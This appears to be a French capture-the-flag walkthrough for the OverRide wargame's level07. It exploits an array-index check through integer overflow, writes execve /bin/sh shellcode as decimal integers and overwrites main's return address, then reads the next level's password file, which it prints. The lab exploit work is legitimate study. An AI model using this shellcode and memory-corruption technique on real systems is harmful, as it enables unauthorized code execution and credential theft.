@@ -1,0 +1,469 @@
+----> je pense qu'il va falloir exploiter notre buffer et lancer un shell dedans ou alors
+----> exploiter l'environnement. Il va nous falloir l'adresse de retour du main je pense:
+
+level07@OverRide:~$ gdb ./level07
+(gdb) disas main
+...
+...
+   0x080489ea <+711>:	lea    -0xc(%ebp),%esp
+   0x080489ed <+714>:	pop    %ebx
+   0x080489ee <+715>:	pop    %esi
+   0x080489ef <+716>:	pop    %edi
+   0x080489f0 <+717>:	pop    %ebp
+   0x080489f1 <+718>:	ret									<- BP*
+End of assembler dump.
+(gdb) b *0x080489f0
+Breakpoint 1 at 0x80489f0
+(gdb) disas store_number
+Dump of assembler code for function store_number:
+...
+   0x080486d5 <+165>:	leave								<- BP*
+   0x080486d6 <+166>:	ret
+End of assembler dump.
+(gdb) b *0x080486d5
+Breakpoint 3 at 0x80486d5
+
+----> Premier BP* a la fin du main pour savoir ou en est la stack.
+----> Et second BP* dans <store_number> pour voir ou on est sur la stack.
+
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: store
+ Number: 1234
+ Index: 1
+
+Breakpoint 6, 0x080486d5 in store_number ()
+(gdb) x/200wx $ebp+0x8
+0xffffd530:	  0xffffd554	0x00000014	0xf7fcfac0	0xf7fdc714
+0xffffd540:	  0x00000098	0xffffffff	0xffffd80c	0xffffd7b8
+0xffffd550:	  0x00000000	0x00000000	0x000004d2	0x00000000 <- On ecrit en 0xffffd554
+0xffffd560:	  0x00000000	0x00000000	0x00000000	0x00000000 1
+0xffffd570:	  0x00000000	0x00000000	0x00000000	0x00000000 2
+0xffffd580:	  0x00000000	0x00000000	0x00000000	0x00000000 3
+0xffffd590:	  0x00000000	0x00000000	0x00000000	0x00000000 4
+0xffffd5a0:	  0x00000000	0x00000000	0x00000000	0x00000000 5
+0xffffd5b0:	  0x00000000	0x00000000	0x00000000	0x00000000 6
+0xffffd5c0:	  0x00000000	0x00000000	0x00000000	0x00000000 7
+0xffffd5d0:	  0x00000000	0x00000000	0x00000000	0x00000000 8
+0xffffd5e0:	  0x00000000	0x00000000	0x00000000	0x00000000 9
+0xffffd5f0:	  0x00000000	0x00000000	0x00000000	0x00000000 10
+0xffffd600:	  0x00000000	0x00000000	0x00000000	0x00000000 11
+0xffffd610:	  0x00000000	0x00000000	0x00000000	0x00000000 12
+0xffffd620:	  0x00000000	0x00000000	0x00000000	0x00000000 13
+0xffffd630:	  0x00000000	0x00000000	0x00000000	0x00000000 14
+0xffffd640:	  0x00000000	0x00000000	0x00000000	0x00000000 15
+0xffffd650:	  0x00000000	0x00000000	0x00000000	0x00000000 16
+0xffffd660:	  0x00000000	0x00000000	0x00000000	0x00000000 17
+0xffffd670:	  0x00000000	0x00000000	0x00000000	0x00000000 18
+0xffffd680:	  0x00000000	0x00000000	0x00000000	0x00000000 19
+0xffffd690:	  0x00000000	0x00000000	0x00000000	0x00000000 20
+0xffffd6a0:	  0x00000000	0x00000000	0x00000000	0x00000000 21
+0xffffd6b0:	  0x00000000	0x00000000	0x00000000	0x00000000 22
+0xffffd6c0:	  0x00000000	0x00000000	0x00000000	0x00000000 23
+0xffffd6d0:	  0x00000000	0x00000000	0x00000000	0x00000000 24
+0xffffd6e0:	  0x00000000	0x00000001	0x726f7473	0x00000065 25
+0xffffd6f0:	  0x00000000	0x00000000	0x00000000	0x09b3aa00 26
+0xffffd700:	  0xf7feb620	0x00000000	0x08048a09	0xf7fceff4 27
+0xffffd710:	  0x00000000	0x00000000	0x00000000	0xf7e45513 28
+0xffffd720:	  0x00000001	0xffffd7b4	0xffffd7bc	0xf7fd3000 29
+0xffffd730:	  0x00000000	0xffffd71c	0xffffd7bc	0x00000000 30
+0xffffd740:	  0x080482b8	0xf7fceff4	0x00000000	0x00000000 31
+0xffffd750:	  0x00000000	0xa91d106b	0x9e1af47b	0x00000000 32
+0xffffd760:	  0x00000000	0x00000000	0x00000001	0x08048510 33
+0xffffd770:	  0x00000000	0xf7ff0a50	0xf7e45429	0xf7ffcff4 34
+0xffffd780:	  0x00000001	0x08048510	0x00000000	0x08048531 35
+0xffffd790:	  0x08048723	0x00000001	0xffffd7b4	0x08048a00 36
+0xffffd7a0:	  0x08048a70	0xf7feb620	0xffffd7ac	0xf7ffd918 37
+0xffffd7b0:	  0x00000001	0xffffd8d5	0x00000000	0xffffd8f1 38
+0xffffd7c0:	  0xffffd901	0xffffd915	0xffffd935	0xffffd948 39
+0xffffd7d0:	  0xffffd955	0xffffde76	0xffffde82	0xffffdecf 40
+0xffffd7e0:	  0xffffdee6	0xffffdef5	0xffffdf0d	0xffffdf1e 41
+0xffffd7f0:	  0xffffdf27	0xffffdf40	0xffffdf48	0xffffdf5a 42
+0xffffd800:	  0xffffdf6a	0xffffdf9a	0xffffdfba	0x00000000 43
+0xffffd810:	  0x00000020	0xf7fdb430	0x00000021	0xf7fdb000 44
+0xffffd820:	  0x00000010	0x178bfbff	0x00000006	0x00001000 45
+0xffffd830:	  0x00000011	0x00000064	0x00000003	0x08048034 46
+0xffffd840:	  0x00000004	0x00000020	0x00000005	0x00000009 47
+
+----> Debut de buffer en 0xffffd554.
+
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: quit
+(gdb) x/20wx $esp
+
+Breakpoint 7, 0x080489ea in main ()
+(gdb) x/20wx $esp
+0xffffd71c:	 0xf7e45513	0x00000001	0xffffd7b4	0xffffd7bc
+0xffffd72c:	 0xf7fd3000	0x00000000	0xffffd71c	0xffffd7bc
+0xffffd73c:	 0x00000000	0x080482b8	0xf7fceff4	0x00000000
+0xffffd74c:	 0x00000000	0x00000000	0xa91d106b	0x9e1af47b
+0xffffd75c:	 0x00000000	0x00000000	0x00000000	0x00000001
+
+----> On se trouve a la fin du main en 0xffffd71c.
+----> Si on calcul si je met un index de 114 je devrais reecrire l'EIP du retour du main.
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 1234
+ Index: 114
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+
+Breakpoint 6, 0x080486d5 in store_number ()
+
+----> Le petit malin ! il a securiser cet index. tout comme l'index 0.
+
+(gdb) c
+Continuing.
+
+Input command: store
+ Number: 1234
+ Index: 0
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+
+Breakpoint 6, 0x080486d5 in store_number ()
+
+(gdb) c
+Continuing.
+ Failed to do store command
+Input command: store
+ Number: 1234
+ Index: 113
+
+Breakpoint 6, 0x080486d5 in store_number ()
+(gdb) c
+Continuing.
+ Completed store command successfully
+Input command: store
+ Number: 1234
+ Index: 115
+
+Breakpoint 6, 0x080486d5 in store_number ()
+(gdb)
+
+-----> On peut ecrire en 113 et 115 et pas 114. L'auteur a bel et bien securiser l'EIP du retour de main ^^.
+-----> Ce qu'il ne sait pas c'est qu'on sait jouer avec les shr et shl.
+-----> Je m'explique: au moment de l'assignation l'assembleur fait:
+ 80486c2: 8b 45 f4              mov    -0xc(%ebp),%eax
+ 80486c5: c1 e0 02             	shl    $0x2,%eax
+ 80486c8: 03 45 08             	add    0x8(%ebp),%eax
+----> C'est a dire que, notre binaire est sur du 32 bits deja, donc un nombre egal a:
+binaire:	0100 0000 0000 0000 0000 0000 0000 0000
+hexa:		0x40000000
+decimal:	1073741824
+----> si on fait un shl de 0x2, on decale tous les 1 de 2 bits vers la gauche.
+----> Du coup ce nombre sera egal a:
+binaire:	0000 0000 0000 0000 0000 0000 0000 0000
+hexa:		0x00000000
+decimal:	0
+----> Zero ! ^^
+----> Sachant cela si on ecrit 114:
+binaire:	0000 0000 0000 0000 0000 0000 0111 0010
+hexa:		0x00000072
+decimal:	114
+----> et que l'on ajoute 0x40000000, un shl 0x2 ecrirait a l'index 114 SANS UTILISER LE CHIFFRE 114 !!
+binaire:	0100 0000 0000 0000 0000 0000 0111 0010
+hexa:		0x40000072
+decimal:	1073741938
+
+----> L'index 1073741938 nous permettrait donc d'ecrire a l'index 114. Essayons:
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level07/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 10
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000a in ?? ()
+
+----> BINGO !!
+----> Reste plus qu'a ecrire notre shellcode en decimal et le stocker dans le buffer ^^.
+----> Galere non:
+(RAPPEL: l'index 0 est 1073741824)
+
+SHELLCODE="\x31\xc0\x50\x68
+			\x2f\x2f\x73\x68
+			\x68\x2f\x62\x69
+			\x6e\x89\xe3\x50
+			\x89\xe2\x53\x89
+			\xe1\xb0\x0b\xcd
+			\x80"
+(gdb) p 0x90909090
+$3 = 2425393296
+(gdb) p 0x31c05068
+$4 = 834687080
+(gdb) p 0x2f2f7368
+$5 = 791638888
+(gdb) p 0x682f6269
+$6 = 1747935849
+(gdb) p 0x6e89e350
+$7 = 1854530384
+(gdb) p 0x89e25389
+$8 = 2313311113
+(gdb) p 0xe1b00bcd
+$9 = 3786410957
+(gdb) p 0x80000000
+$10 = 2147483648
+(gdb) p 0xffffd554
+$11 = 4294956372
+level07@OverRide:/tmp$ python -c 'print "store\n2425393296\n1073741824\n" + "store\n834687080\n1\n" + "store\n791638888\n2\n" + "store\n1747935849\n3\n" + "store\n1854530384\n4\n" + "store\n2313311113\n5\n"+ "store\n3786410957\n6\n" + "store\n2147483648\n7\n" + "store\n4294956372\n1073741938\n" + "quit\n"' | ~/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Segmentation fault (core dumped)
+level07@OverRide:/tmp$
+
+----> AH ! les index multiples de 3 sont reserves !!
+----> Du coup:
+binaire: 0000 0000 0000 0000 0000 0000 0000 0011
+hexa:	 0x3
+decimal: 3
+binaire: 0100 0000 0000 0000 0000 0000 0000 0011
+hexa:	 0x40000003
+decimal: 1073741827
+
+binaire: 0000 0000 0000 0000 0000 0000 0000 0110
+hexa:	 0x6
+decimal: 6
+binaire: 0100 0000 0000 0000 0000 0000 0000 0110
+hexa:	 0x40000006
+decimal: 1073741830
+
+----> On execute tout ca:
+
+level07@OverRide:/tmp$ python -c 'print "store\n2425393296\n1073741824\n" + "store\n834687080\n1\n" + "store\n791638888\n2\n" + "store\n1747935849\n1073741827\n" + "store\n1854530384\n4\n" + "store\n2313311113\n5\n"+ "store\n3786410957\n1073741830\n" + "store\n2147483648\n7\n" + "store\n4294956372\n1073741938\n" + "quit\n"' | ~/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Segmentation fault (core dumped)
+
+------> Ah ! Je me suis tromper d'adresse le buffer est en 0xffffd4c4. Et les bits sont en little endian, donc il faut inverser les bits tous les 4 octets:
+
+SHELLCODE="\x31\xc0\x50\x68
+			\x2f\x2f\x73\x68
+			\x68\x2f\x62\x69
+			\x6e\x89\xe3\x50
+			\x89\xe2\x53\x89
+			\xe1\xb0\x0b\xcd
+			\x80"
+(gdb) p 0x6850c031
+$1 = 1750122545
+(gdb) p 0x68732f2f
+$2 = 1752379183
+(gdb) p 0x69622f68
+$3 = 1768042344
+(gdb) p 0x50e3896e
+$4 = 1357089134
+(gdb) p 0x8953e289
+$5 = 2303976073
+(gdb) p 0xcd0bb0e1
+$7 = 3440095457
+(gdb) p 0x00000080
+$6 = 128
+
+store
+2425393296		// 0x90909090
+1073741824		// index 0
+store
+1750122545		// 0x6850c031
+1
+store
+1752379183		// 0x68732f2f
+2
+store
+1768042344		// 0x69622f68
+1073741827		// index 3
+store
+1357089134		// 0x50e3896e
+4
+store
+2303976073		// 0x8953e289
+5
+store
+3440095457		// 0xcd0bb0e1
+1073741830		// index 6
+store
+128		// 0x00000080
+7
+store
+4294956228		// 0xffffd4c4
+1073741938		// index 114
+
+----> Dans le shell:
+
+level07@OverRide:~$ python -c 'print "store\n2425393296\n1073741824\n" + "store\n1750122545\n1\n" + "store\n1752379183\n2\n" + "store\n1768042344\n1073741827\n" + "store\n1357089134\n4\n" + "store\n2303976073\n5\n"+ "store\n3440095457\n1073741830\n" + "store\n128\n7\n" + "store\n4294956228\n1073741938\n" + "quit\n"' | ~/level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Illegal instruction (core dumped)
+
+---> Et oui. Hors gdb l'adresse est 100% differente.
+----> On a vu qu'en memoire:
+(gdb) x/20wx $esp
+0xffffd4a0:	 0xffffd4c4	0x00000014	0xf7fcfac0	0xf7fdc714
+0xffffd4b0:	 0x00000098	0xffffffff	0xffffd780	0xffffd728
+0xffffd4c0:	 0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd4d0:	 0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd4e0:	 0x00000000	0x00000000	0x00000000	0x00000000
+
+-----> notre buffer commence en 0xffffd4c4 et que cette adresse se trouve a l'index -9 de notre tableau :D
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: read
+ Index: -9
+ Number at data[4294967287] is 4294956420		<- adresse en decimal de notre buffer ^^
+ Completed read command successfully
+Input command: store							<- On ecrit tout a la main
+ Number: 2425393296								<- 0x90909090
+ Index: 1073741824								<- index 0
+ Completed store command successfully
+Input command: store
+ Number: 1750122545
+ Index: 1
+ Completed store command successfully
+Input command: 1752379183
+ Failed to do 1752379183 command
+Input command: 2
+ Failed to do 2 command
+Input command: store
+ Number: 1752379183
+ Index: 2
+ Completed store command successfully
+Input command: store
+ Number: 1768042344
+ Index: 1073741827								<- index 3
+ Completed store command successfully
+Input command: store
+ Number: 1357089134
+ Index: 4
+ Completed store command successfully
+Input command: store
+ Number: 2303976073
+ Index: 5
+ Completed store command successfully
+Input command: store
+ Number: 3440095457
+ Index: 1073741830								<- index 6
+ Completed store command successfully
+Input command: store
+ Number: 128
+ Index: 7
+ Completed store command successfully
+Input command: store
+ Number: 4294956420								<- adresse de notre buffer
+ Index: 1073741938								<- index 114. (return du main)
+ Completed store command successfully
+Input command: quit
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+$ exit
+level07@OverRide:~$
+
+
+ez...
